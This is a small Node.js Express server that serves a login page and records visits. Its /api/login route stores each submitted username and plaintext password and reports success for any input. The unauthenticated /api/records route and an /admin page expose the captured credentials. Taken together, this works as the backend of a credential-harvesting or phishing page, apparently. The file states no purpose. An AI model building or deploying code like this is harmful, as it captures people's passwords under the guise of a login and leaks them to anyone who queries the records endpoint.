const express = require('express');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let records = [];

// Record visits
app.get('/', (req, res) => {
    records.unshift({ type: 'Page Visit', timestamp: new Date().toLocaleString(), ip: 'Unknown' });
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login.html', (req, res) => {
    records.unshift({ type: 'Login Page Visit', timestamp: new Date().toLocaleString(), ip: 'Unknown' });
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    records.unshift({ type: 'Login Attempt', username, password, timestamp: new Date().toLocaleString(), ip: 'Unknown' });
    res.json({ success: true });
});

app.get('/api/records', (req, res) => {
    res.json(records);
});

// Admin Route
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});